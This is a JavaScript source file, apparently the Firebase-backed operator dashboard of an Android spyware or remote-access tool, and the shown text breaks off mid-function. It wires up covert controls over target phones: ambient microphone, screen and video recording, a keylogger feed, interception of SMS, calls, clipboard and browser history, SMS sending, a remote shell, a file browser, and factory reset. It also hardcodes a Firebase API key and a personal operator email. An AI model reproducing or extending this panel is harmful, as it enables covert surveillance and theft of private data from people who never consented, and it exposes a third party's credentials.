import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js';
import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js';
import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-storage.js';

// ==========================================
// Firebase Configuration
// ==========================================
const firebaseConfig = {
    apiKey: "AIzaSyBhaPM20tIhMalxLjoCklmwy4qb1ZkraSo",
    authDomain: "guardianos-30b18.firebaseapp.com",
    projectId: "guardianos-30b18",
    storageBucket: "guardianos-30b18.appspot.com",
    messagingSenderId: "323558398331",
    appId: "1:323558398331:android:a022a1e38b48a0247705de",
    databaseURL: "https://guardianos-30b18-default-rtdb.europe-west1.firebasedatabase.app"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);
const storage = getStorageInstance(app);

// ==========================================
// Global Variables
// ==========================================
let currentUser = null;
let selectedDevice = null;
let allDevices = [];
let deviceListeners = {};

const ALLOWED_OPERATOR_EMAIL = "nicholasbagenda@gmail.com";

// ==========================================
// DOM Elements
// ==========================================
const noDeviceAlert = document.getElementById('no-device-alert');
const deviceDashboard = document.getElementById('device-dashboard');
const devicesList = document.getElementById('devices-list');
const deviceCount = document.getElementById('device-count');
const logoutBtn = document.getElementById('btn-logout');
const refreshDevicesBtn = document.getElementById('btn-refresh-devices');

// ==========================================
// INITIALIZATION
// ==========================================
onAuthStateChanged(auth, (user) => {
    if (user && user.email?.toLowerCase() === ALLOWED_OPERATOR_EMAIL.toLowerCase()) {
        currentUser = user;
        console.log("👤 Operator logged in:", user.email);
        loadAllDevices();
    } else {
        console.log("⛔ Access denied - not authorized operator");
        window.location.href = './index.html';
    }
});

// ==========================================
// LOAD DEVICES FROM /devices STRUCTURE
// ==========================================
function loadAllDevices() {
    const devicesRef = ref(database, 'devices');
    onValue(devicesRef, (snapshot) => {
        allDevices = [];

        if (snapshot.exists()) {
            const data = snapshot.val();

            Object.keys(data).forEach(deviceUid => {
                const deviceData = data[deviceUid];

                const model = deviceData.identity?.model || "Unknown Model";
                const customName = deviceData.identity?.custom_name || deviceData.deviceName || "Unknown Device";

                allDevices.push({
                    uid: deviceUid,
                    name: `${customName} (${model})`,
                    battery: deviceData.battery_level || deviceData.status?.batteryPercentage || 0,
                    lastSeen: deviceData.last_seen || 0,
                    online: (Date.now() - (deviceData.last_seen || 0)) < 300000,
                    networkType: deviceData.status?.networkType || "UNKNOWN",
                    lat: deviceData.location?.lat || deviceData.status?.latitude || 0,
                    lng: deviceData.location?.lng || deviceData.status?.longitude || 0
                });
            });

            renderDevicesList();
            if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
        } else {
            showNoDeviceAlert();
        }
    });
}

// ==========================================
// RENDER DEVICES LIST
// ==========================================
function renderDevicesList() {
    devicesList.innerHTML = '';
    deviceCount.textContent = allDevices.length;

    allDevices.forEach(device => {
        const deviceItem = document.createElement('div');
        deviceItem.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
        deviceItem.innerHTML = `
            <div class="device-item-info">
                <div class="device-item-name">${device.name}</div>
                <div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">
                    ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%
                </div>
            </div>`;

        deviceItem.addEventListener('click', () => selectDevice(device.uid));
        devicesList.appendChild(deviceItem);
    });

    if (allDevices.length === 0) showNoDeviceAlert();
    else {
        noDeviceAlert.style.display = 'none';
        deviceDashboard.style.display = 'block';
    }
}

// ==========================================
// SELECT DEVICE
// ==========================================
function selectDevice(deviceUid) {
    selectedDevice = deviceUid;

    renderDevicesList();
    noDeviceAlert.style.display = 'none';
    deviceDashboard.style.display = 'block';

    injectAdvancedControls();

    // Clean up old listeners
    Object.keys(deviceListeners).forEach(key => {
        try { off(deviceListeners[key]); } catch(e) {}
    });
    deviceListeners = {};

    loadDeviceData(deviceUid);
    setupCommandListeners(deviceUid);
}

// ==========================================
// INJECT ALL 20+ ADVANCED CONTROLS
// ==========================================
function injectAdvancedControls() {
    if (document.getElementById('cmd-audio')) return;

    const matrix = document.querySelector('.card-grid');
    if (!matrix) return;

    // ── SECTION: Time Activation ──────────────
    const timeWrapper = document.createElement('div');
    timeWrapper.className = 'time-control-wrapper';
    timeWrapper.innerHTML = `
        <label class="time-control-label">
            <i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE
        </label>
        <input type="time" id="time-setter">
    `;
    matrix.parentElement.insertBefore(timeWrapper, matrix.nextSibling);

    // ── SECTION: Media Controls ───────────────
    const audioBtn = createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF');
    matrix.appendChild(audioBtn);

    const videoBtn = createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF');
    matrix.appendChild(videoBtn);

    const ambientBtn = createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF');
    matrix.appendChild(ambientBtn);

    const screenRecBtn = createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF');
    matrix.appendChild(screenRecBtn);

    // ── SECTION: Data Extraction ──────────────
    const sectionData = createSectionHeader('📊 DATA EXTRACTION');
    matrix.parentElement.insertBefore(sectionData, matrix.nextSibling);

    const readSmsBtn = createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER');
    matrix.appendChild(readSmsBtn);

    const readCallsBtn = createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER');
    matrix.appendChild(readCallsBtn);

    const readContactsBtn = createMatrixBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER');
    matrix.appendChild(readContactsBtn);

    const readAppsBtn = createMatrixBtn('cmd-readapps', 'fa-grid-2', 'APP LIST', 'TRIGGER');
    matrix.appendChild(readAppsBtn);

    const scanWifiBtn = createMatrixBtn('cmd-scanwifi', 'fa-wifi', 'SCAN WIFI', 'TRIGGER');
    matrix.appendChild(scanWifiBtn);

    const readBatteryBtn = createMatrixBtn('cmd-readbattery', 'fa-battery-full', 'BATTERY', 'TRIGGER');
    matrix.appendChild(readBatteryBtn);

    const readTrafficBtn = createMatrixBtn('cmd-readtraffic', 'fa-arrow-up-arrow-down', 'TRAFFIC', 'TRIGGER');
    matrix.appendChild(readTrafficBtn);

    const deviceInfoBtn = createMatrixBtn('cmd-deviceinfo', 'fa-circle-info', 'DEVICE INFO', 'TRIGGER');
    matrix.appendChild(deviceInfoBtn);

    const clipboardBtn = createMatrixBtn('cmd-clipboard', 'fa-clipboard', 'CLIPBOARD', 'OFF');
    matrix.appendChild(clipboardBtn);

    const galleryBtn = createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER');
    matrix.appendChild(galleryBtn);

    const browserBtn = createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER');
    matrix.appendChild(browserBtn);

    // ── SECTION: Remote Control ───────────────
    const sectionRemote = createSectionHeader('🎮 REMOTE CONTROL');
    matrix.parentElement.insertBefore(sectionRemote, matrix.nextSibling);

    const screenshotBtn = createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER');
    matrix.appendChild(screenshotBtn);

    const storageBtn = createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER');
    matrix.appendChild(storageBtn);

    // Shell command input
    const shellWrapper = document.createElement('div');
    shellWrapper.className = 'shell-control-wrapper';
    shellWrapper.innerHTML = `
        <label class="time-control-label">
            <i class="fa-solid fa-terminal"></i> REMOTE SHELL
        </label>
        <div style="display:flex;gap:8px;">
            <input type="text" id="shell-input" placeholder="ls /sdcard" 
                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
            <button id="cmd-shell" class="matrix-btn" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">RUN</button>
        </div>
        <pre id="shell-output" style="background:#0a0a1a;color:#00ff88;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:200px;overflow:auto;display:none;white-space:pre-wrap;"></pre>
    `;
    matrix.parentElement.insertBefore(shellWrapper, matrix.nextSibling);

    // SMS send input
    const smsWrapper = document.createElement('div');
    smsWrapper.className = 'shell-control-wrapper';
    smsWrapper.innerHTML = `
        <label class="time-control-label">
            <i class="fa-solid fa-paper-plane"></i> SEND SMS
        </label>
        <div style="display:flex;gap:8px;margin-bottom:8px;">
            <input type="text" id="sms-number" placeholder="+256700123456" 
                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
        </div>
        <div style="display:flex;gap:8px;">
            <input type="text" id="sms-body" placeholder="Message text..." 
                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            <button id="cmd-sendsms" class="matrix-btn" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SEND</button>
        </div>
    `;
    matrix.parentElement.insertBefore(smsWrapper, matrix.nextSibling);

    // File browser input
    const fileWrapper = document.createElement('div');
    fileWrapper.className = 'shell-control-wrapper';
    fileWrapper.innerHTML = `
        <label class="time-control-label">
            <i class="fa-solid fa-folder-open"></i> FILE BROWSER
        </label>
        <div style="display:flex;gap:8px;">
            <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0"
                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
            <button id="cmd-listfiles" class="matrix-btn" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">LIST</button>
        </div>
        <pre id="file-output" style="background:#0a0a1a;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:200px;overflow:auto;display:none;white-space:pre-wrap;"></pre>
    `;
    matrix.parentElement.insertBefore(fileWrapper, matrix.nextSibling);

    // Geofence input
    const geoWrapper = document.createElement('div');
    geoWrapper.className = 'shell-control-wrapper';
    geoWrapper.innerHTML = `
        <label class="time-control-label">
            <i class="fa-solid fa-location-crosshairs"></i> GEOFENCE
        </label>
        <div style="display:flex;gap:8px;margin-bottom:8px;">
            <input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001"
                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            <input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001"
                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            <input type="number" id="geo-radius" placeholder="Radius (m)" value="1000"
                   style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
        </div>
        <div style="display:flex;gap:8px;">
            <button id="cmd-setgeo" class="matrix-btn" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SET GEOFENCE</button>
            <button id="cmd-disablegeo" class="matrix-btn" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">DISABLE</button>
        </div>
    `;
    matrix.parentElement.insertBefore(geoWrapper, matrix.nextSibling);

    // ── SECTION: Danger Zone ──────────────────
    const sectionDanger = createSectionHeader('⚠️ DANGER ZONE');
    matrix.parentElement.insertBefore(sectionDanger, matrix.nextSibling);

    const uninstallBtn = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER');
    uninstallBtn.style.borderColor = '#ff6b6b';
    matrix.appendChild(uninstallBtn);

    const rebootBtn = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER');
    rebootBtn.style.borderColor = '#ff6b6b';
    matrix.appendChild(rebootBtn);

    const shutdownBtn = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER');
    shutdownBtn.style.borderColor = '#ff6b6b';
    matrix.appendChild(shutdownBtn);

    const factoryBtn = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER');
    factoryBtn.style.borderColor = '#ff0000';
    matrix.appendChild(factoryBtn);

    const lockNowBtn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER');
    lockNowBtn.style.borderColor = '#ff6b6b';
    matrix.appendChild(lockNowBtn);

    // ── SECTION: Data Display Panels ──────────
    const sectionDisplay = createSectionHeader('📋 LIVE DATA FEEDS');
    matrix.parentElement.insertBefore(sectionDisplay, matrix.nextSibling);

    const dataPanels = document.createElement('div');
    dataPanels.className = 'data-panels-grid';
    dataPanels.innerHTML = `
        <div class="data-panel" id="panel-sms">
            <div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div>
            <div class="data-panel-body" id="sms-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-calls">
            <div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div>
            <div class="data-panel-body" id="calls-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-contacts">
            <div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div>
            <div class="data-panel-body" id="contacts-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-wifi">
            <div class="data-panel-header">📡 Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div>
            <div class="data-panel-body" id="wifi-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-apps">
            <div class="data-panel-header">📦 Installed Apps <span id="apps-count" class="badge">0</span></div>
            <div class="data-panel-body" id="apps-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-deviceinfo">
            <div class="data-panel-header">📋 Device Info</div>
            <div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-battery">
            <div class="data-panel-header">🔋 Battery Details</div>
            <div class="data-panel-body" id="battery-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-keylog">
            <div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div>
            <div class="data-panel-body" id="keylog-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-geofence">
            <div class="data-panel-header">📍 Geofence Alerts</div>
            <div class="data-panel-body" id="geofence-feed">No alerts</div>
        </div>
        <div class="data-panel" id="panel-clipboard">
            <div class="data-panel-header">📋 Clipboard</div>
            <div class="data-panel-body" id="clipboard-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-browser">
            <div class="data-panel-header">🌐 Browser History</div>
            <div class="data-panel-body" id="browser-feed">Waiting for data...</div>
        </div>
        <div class="data-panel" id="panel-gallery">
            <div class="data-panel-header">🖼️ Gallery</div>
            <div class="data-panel-body" id="gallery-feed">Waiting for data...</div>
        </div>
    `;
    matrix.parentElement.insertBefore(dataPanels, matrix.nextSibling);
}

// Helper: Create a matrix button
function createMatrixBtn(id, icon, label, stateText) {
    const btn = document.createElement('button');
    btn.id = id;
    btn.className = 'matrix-btn toggle-btn';
    btn.innerHTML = `<i class="fa-solid ${icon}"></i><span>${label}</span><span class="toggle-state">${stateText}</span>`;
    return btn;
}

// Helper: Create section header
function createSectionHeader(title) {
    const header = document.createElement('div');
    header.className = 'section-header';
    header.innerHTML = `<h3 style="color:#00ff88;margin:20px 0 10px;padding:10px;border-bottom:1px solid #333;font-size:14px;letter-spacing:2px;">${title}</h3>`;
    return header;
}

// ==========================================
// LOAD DEVICE DATA
// ==========================================
function loadDeviceData(deviceUid) {
    const device = allDevices.find(d => d.uid === deviceUid);
    if (!device) return;

    document.getElementById('selected-device-name').textContent = device.name;
    initializeTelemetryStream(deviceUid);
    initializeCommandStateListeners(deviceUid);
    initializeDataFeedListeners(deviceUid);
}

// ==========================================
// REAL-TIME TELEMETRY STREAM
// ==========================================
function initializeTelemetryStream(uid) {
    const statusRef = ref(database, `devices/${uid}/status`);

    if (deviceListeners[`status-${uid}`]) off(deviceListeners[`status-${uid}`]);

    const listener = onValue(statusRef, (snapshot) => {
        if (!snapshot.exists()) return;
        const data = snapshot.val();

        // Battery
        if (document.getElementById('battery-text')) {
            document.getElementById('battery-text').textContent =
                data.batteryPercentage !== undefined ? `${data.batteryPercentage}%` : "--%";
            const bar = document.getElementById('battery-bar');
            if (bar) bar.style.width = `${data.batteryPercentage || 0}%`;
        }

        // GPS
        if (document.getElementById('latitude-text') && data.latitude != null) {
            document.getElementById('latitude-text').textContent = parseFloat(data.latitude).toFixed(6);
            document.getElementById('longitude-text').textContent = parseFloat(data.longitude).toFixed(6);
            const mapLink = document.getElementById('map-link');
            if (mapLink) mapLink.href = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        }

        // Media upload state
        const uploadState = data.media_upload_state || "idle";
        ['cmd-audio', 'cmd-video'].forEach(btnId => {
            const btn = document.getElementById(btnId);
            if (!btn) return;
            const stateEl = btn.querySelector('.toggle-state');
            if (uploadState === "recording") {
                btn.classList.add('active');
                if (stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
            } else if (uploadState === "uploading") {
                btn.classList.add('active');
                if (stateEl) { stateEl.textContent = 'UPD...'; stateEl.style.color = '#00e5ff'; }
            }
        });

        // Media display
        const img = document.getElementById('cameraPreviewFrame');
        const video = document.getElementById('mediaVideoPlayer');
        const audio = document.getElementById('mediaAudioPlayer');
        const audioContainer = document.getElementById('audio-container');
        const placeholder = document.getElementById('mediaPlaceholderText');
        const timestamp = document.getElementById('captureTimestamp');

        const hideAll = () => {
            if (img) img.style.display = 'none';
            if (video) { video.style.display = 'none'; video.pause(); }
            if (audio) { audio.style.display = 'none'; audio.pause(); }
            if (audioContainer) audioContainer.style.display = 'none';
            if (placeholder) placeholder.style.display = 'block';
        };

        const photoUrl = data.lastPhotoUrl || data.last_photo_url;
        const videoUrl = data.lastVideoUrl || data.last_video_url;
        const audioUrl = data.lastAudioUrl || data.last_audio_url;

        let activeMedia = false;

        if (photoUrl && img) {
            hideAll();
            const cacheBuster = photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`;
            img.src = photoUrl + cacheBuster;
            img.style.display = 'block';
            activeMedia = true;
        } else if (videoUrl && video) {
            hideAll();
            if (video.src !== videoUrl) { video.src = videoUrl; video.load(); }
            video.style.display = 'block';
            activeMedia = true;
        } else if (audioUrl && audio) {
            hideAll();
            if (audio.src !== audioUrl) { audio.src = audioUrl; audio.load(); }
            audio.style.display = 'block';
            if (audioContainer) audioContainer.style.display = 'block';
            activeMedia = true;
        }

        if (activeMedia && timestamp) {
            timestamp.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
        } else if (!activeMedia && placeholder) {
            placeholder.style.display = 'block';
        }
    });

    deviceListeners[`status-${uid}`] = listener;
}

// ==========================================
// COMMAND STATE LISTENERS
// ==========================================
function initializeCommandStateListeners(uid) {
    const commandsRef = ref(database, `devices/${uid}/commands`);
    const listener = onValue(commandsRef, (snapshot) => {
        const cmd = snapshot.val() || {};

        updateButtonState('cmd-flashlight', cmd.flashlight);
        updateButtonState('cmd-alarm', cmd.alarm);
        updateButtonState('cmd-lock', cmd.emergencyLock);
        updateButtonState('cmd-capture', cmd.cameraCapture);
        updateButtonState('cmd-audio', cmd.record_audio);
        updateButtonState('cmd-video', cmd.record_video);
        updateButtonState('cmd-ambient', cmd.start_ambient);
        updateButtonState('cmd-screenrec', cmd.record_screen);
        updateButtonState('cmd-clipboard', cmd.monitor_clipboard);

        const timeInput = document.getElementById('time-setter');
        if (timeInput && cmd.activation_time) {
            if (document.activeElement !== timeInput) {
                timeInput.value = cmd.activation_time;
            }
        }
    });
    deviceListeners[`commands-${uid}`] = listener;
}

// ==========================================
// DATA FEED LISTENERS (ALL 20 FEATURES)
// ==========================================
function initializeDataFeedListeners(uid) {
    // SMS Feed
    listenToFeed(uid, 'sms', (data) => {
        const messages = data.messages || [];
        document.getElementById('sms-count').textContent = messages.length;
        const feed = document.getElementById('sms-feed');
        if (messages.length === 0) { feed.innerHTML = 'No SMS data yet'; return; }
        feed.innerHTML = messages.map(m =>
            `<div class="feed-item"><strong>${m.sender || 'Unknown'}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
        ).join('');
    });

    // Live SMS
    listenToFeed(uid, 'sms_live', (data) => {
        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
        const feed = document.getElementById('sms-feed');
        if (items.length > 0) {
            const liveHtml = items.map(m =>
                `<div class="feed-item live-item">🔴 <strong>${m.sender || 'Unknown'}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
            ).join('');
            feed.innerHTML = liveHtml + feed.innerHTML;
        }
    });

    // Call Log
    listenToFeed(uid, 'call_log', (data) => {
        const calls = data.calls || [];
        document.getElementById('calls-count').textContent = calls.length;
        const feed = document.getElementById('calls-feed');
        if (calls.length === 0) { feed.innerHTML = 'No call data yet'; return; }
        feed.innerHTML = calls.map(c => {
            const icon = c.type === 'incoming' ? '📥' : c.type === 'outgoing' ? '📤' : '❌';
            const dur = c.duration_seconds ? `${Math.floor(c.duration_seconds / 60)}m ${c.duration_seconds % 60}s` : '--';
            return `<div class="feed-item">${icon} <strong>${c.name || c.number || 'Unknown'}</strong> <small>${formatTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;
        }).join('');
    });

    // Live Calls
    listenToFeed(uid, 'calls_live', (data) => {
        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 10);
        const feed = document.getElementById('calls-feed');
        if (items.length > 0) {
            const liveHtml = items.map(c => {
                const icon = c.state === 'ringing' ? '🔔' : c.state === 'offhook' ? '📞' : '📴';
                return `<div class="feed-item live-item">${icon} <strong>${c.name || c.number || 'Unknown'}</strong> <small>${c.state} • ${formatTime(c.timestamp)}</small></div>`;
            }).join('');
            feed.innerHTML = liveHtml + feed.innerHTML;
        }
    });

    // Contacts
    listenToFeed(uid, 'contacts', (data) => {
        const contacts = data.contacts || [];
        document.getElementById('contacts-count').textContent = contacts.length;
        const feed = document.getElementById('contacts-feed');
        if (contacts.length === 0) { feed.innerHTML = 'No contact data yet'; return; }
        feed.innerHTML = contacts.slice(0, 100).map(c =>
            `<div class="feed-item"><strong>${escapeHtml(c.name || 'Unknown')}</strong> <small>${c.number || ''} • ${c.type || ''}</small></div>`
        ).join('') + (contacts.length > 100 ? `<div class="feed-item">... and ${contacts.length - 100} more</div>` : '');
    });

    // Wi-Fi
    listenToFeed(uid, 'wifi', (data) => {
        const networks = data.nearby_networks || [];
        document.getElementById('wifi-count').textContent = networks.length;
        const feed = document.getElementById('wifi-feed');
        const currentSsid = data.current_ssid || 'Not connected';
        let html = `<div class="feed-item" style="color:#00ff88;"> Connected: <strong>${escapeHtml(currentSsid)}</strong> (RSSI: ${data.current_rssi || '--'})</div>`;
        html += networks.slice(0, 30).map(n => {
            const bars = n.signal_strength > -50 ? '🟢' : n.signal_strength > -70 ? '🟡' : '🔴';
            const lock = n.is_secured ? '🔒' : '🔓';
            return `<div class="feed-item">${bars} ${lock} <strong>${escapeHtml(n.ssid || 'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;
        }).join('');
        feed.innerHTML = html;
    });

    // Apps
    listenToFeed(uid, 'installed_apps', (data) => {
        const apps = data.apps || [];
        document.getElementById('apps-count').textContent = apps.length;
        const feed = document.getElementById('apps-feed');
        if (apps.length === 0) { feed.innerHTML = 'No app data yet'; return; }
        const userApps = apps.filter(a => !a.is_system);
        const sysApps = apps.filter(a => a.is_system);
        let html = `<div class="feed-item" style="color:#00ff88;">📦 ${userApps.length} user apps • ${sysApps.length} system apps</div>`;
        html += userApps.slice(0, 50).map(a =>
            `<div class="feed-item"><strong>${escapeHtml(a.name || a.package_name)}</strong> <small>v${a.version_name || '?'} • ${a.package_name}</small></div>`
        ).join('');
        feed.innerHTML = html;
    });

    // Device Info
    listenToFeed(uid, 'device_info', (data) => {
        const feed = document.getElementById('deviceinfo-feed');
        const rows = [
            ['Model', data.model], ['Brand', data.brand], ['Android', data.android_version],
            ['SDK', data.sdk_version], ['Storage', `${data.storage_used_percent || '?'}% used (${data.storage_free_gb || '?'}GB free)`],
            ['RAM', `${data.ram_available_mb || '?'}MB / ${data.ram_total_mb || '?'}MB`],
            ['Carrier', data.carrier], ['Network', data.network_type],
            ['Wi-Fi', data.wifi_ssid], ['IP', data.wifi_ip],
            ['Screen', `${data.screen_width}x${data.screen_height}`],
            ['Uptime', `${Math.floor((data.uptime_seconds || 0) / 3600)}h ${Math.floor(((data.uptime_seconds || 0) % 3600) / 60)}m`]
        ];
        feed.innerHTML = rows.map(([k, v]) =>
            `<div class="feed-item"><strong>${k}:</strong> ${v || '--'}</div>`
        ).join('');
    });

    // Battery
    listenToFeed(uid, 'battery_current', (data) => {
        const feed = document.getElementById('battery-feed');
        const rows = [
            ['Level', `${data.level_percent || '?'}%`], ['Status', data.status],
            ['Health', data.health], ['Temperature', `${data.temperature_c || '?'}°C`],
            ['Voltage', `${data.voltage_mv || '?'}mV`], ['Source', data.charge_source],
            ['Technology', data.technology]
        ];
        feed.innerHTML = rows.map(([k, v]) =>
            `<div class="feed-item"><strong>${k}:</strong> ${v || '--'}</div>`
        ).join('');
    });

    // Keylogger
    listenToFeed(uid, 'keylog', (data) => {
        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 50);
        document.getElementById('keylog-count').textContent = items.length;
        const feed = document.getElementById('keylog-feed');
        if (items.length === 0) { feed.innerHTML = 'No keystrokes yet (enable Accessibility Service)'; return; }
        feed.innerHTML = items.map(k =>
            `<div class="feed-item"><strong>${escapeHtml(k.app || 'unknown')}</strong> <small>${formatTime(k.timestamp)}</small><br><code>${escapeHtml(k.text || '')}</code></div>`
        ).join('');
    });

    // Geofence Alerts
    listenToFeed(uid, 'geofence_alerts', (data) => {
        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
        const feed = document.getElementById('geofence-feed');
        if (items.length === 0) { feed.innerHTML = 'No geofence alerts'; return; }
        feed.innerHTML = items.map(g => {
            const icon = g.event === 'LEFT' ? '🚨' : '✅';
            return `<div class="feed-item ${g.event === 'LEFT' ? 'alert-item' : ''}">${icon} <strong>${g.event}</strong> <small>${formatTime(g.timestamp)} • ${Math.round(g.distance_meters || 0)}m away</small><br>📍 ${parseFloat(g.current_lat || 0).toFixed(6)}, ${parseFloat(g.current_lng || 0).toFixed(6)}</div>`;
        }).join('');
    });

    // Clipboard
    listenToFeed(uid, 'clipboard', (data) => {
        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
        const feed = document.getElementById('clipboard-feed');
        if (items.length === 0) { feed.innerHTML = 'No clipboard data yet'; return; }
        feed.innerHTML = items.map(c =>
            `<div class="feed-item"><small>${formatTime(c.timestamp)} • ${c.length || 0} chars</small><br><code>${escapeHtml((c.text || '').substring(0, 200))}</code></div>`
        ).join('');
    });

    // Also listen to clipboard_current
    listenToFeed(uid, 'clipboard_current', (data) => {
        const feed = document.getElementById('clipboard-feed');
        if (data && data.text) {
            feed.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT CLIPBOARD</strong> <small>${formatTime(data.timestamp)}</small><br><code>${escapeHtml(data.text.substring(0, 300))}</code></div>` + feed.innerHTML;
        }
    });

    // Browser History
    listenToFeed(uid, 'browser_history', (data) => {
        const history = data.history || [];
        const feed = document.getElementById('browser-feed');
        if (history.length === 0) { feed.innerHTML = 'No browser history yet'; return; }
        feed.innerHTML = history.slice(0, 50).map(h =>
            `<div class="feed-item"><strong>${escapeHtml(h.title || 'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${escapeHtml((h.url || '').substring(0, 80))}</a> <small>${formatTime(h.date)}</small></div>`
        ).join('');
    });

    // Gallery
    listenToFeed(uid, 'gallery_list', (data) => {
        const photos = data.photos || [];
        const feed = document.getElementById('gallery-feed');
        if (photos.length === 0) { feed.innerHTML = 'No gallery data yet'; return; }
        feed.innerHTML = photos.slice(0, 30).map(p =>
            `<div class="feed-item">🖼️ <strong>${escapeHtml(p.name || 'Unknown')}</strong> <small>${formatTime(p.date_taken)} • ${(p.size_kb || 0)}KB</small></div>`
        ).join('');
    });

    // Shell Output
    listenToFeed(uid, 'shell_output', (data) => {
        const output = document.getElementById('shell-output');
        if (output && data) {
            output.style.display = 'block';
            output.textContent = `$ ${data.command || ''}\n\n${data.stdout || '(no output)'}\n${data.stderr ? '\nSTDERR: ' + data.stderr : ''}\n\nExit code: ${data.exit_code ?? '?'}`;
        }
    });

    // File Browser
    listenToFeed(uid, 'file_browser', (data) => {
        const output = document.getElementById('file-output');
        if (output && data) {
            output.style.display = 'block';
            const entries = data.entries || [];
            let html = `📁 ${data.current_path || '/'}\n\n`;
            html += entries.map(e => {
                const icon = e.is_directory ? '📁' : '📄';
                const size = e.is_directory ? '' : ` (${formatSize(e.size)})`;
                return `${icon} ${e.name}${size}`;
            }).join('\n');
            output.textContent = html;
        }
    });

    // Geofence Status
    listenToFeed(uid, 'geofence_status', (data) => {
        const feed = document.getElementById('geofence-feed');
        if (data && data.active) {
